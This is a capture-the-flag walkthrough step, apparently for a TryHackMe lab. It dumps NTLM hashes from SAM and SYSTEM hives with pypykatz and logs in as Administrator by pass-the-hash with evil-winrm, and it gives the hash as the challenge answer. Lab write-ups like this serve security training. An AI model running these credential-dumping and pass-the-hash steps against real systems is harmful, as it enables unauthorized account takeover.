**Extracting Hashes with Pypykatz and Gaining Access**

#Attaking_Machine 
Extract the hive secrets from the SAM and SYSTEM files using the `pypykatz`. If not present on your Kali Linux, you can download it from its **[GitHub](https://github.com/skelsec/pypykatz)**.

```
pypykatz registry --sam sam system
```

![[pypykatz.png]]

> [!Note]
> The underlined string is the NTLM of the Administrator account.


It has successfully extracted the NTLM hashes of the Administrator account and other users as well.

Use the Administrator NTLM hash and log in directly by Evil-WinRM.

```
evil-winrm -i k2.thm -u administrator -H "9545b61858c043477c350ae86c37b32f"   
```

![[administrator.png]]

> [!Question] What is the Administrator's NTLM hash?
>9545b61858c043477c350ae86c37b32f

**Next step:** [[Middle Camp/Root's flag|Root's flag]]
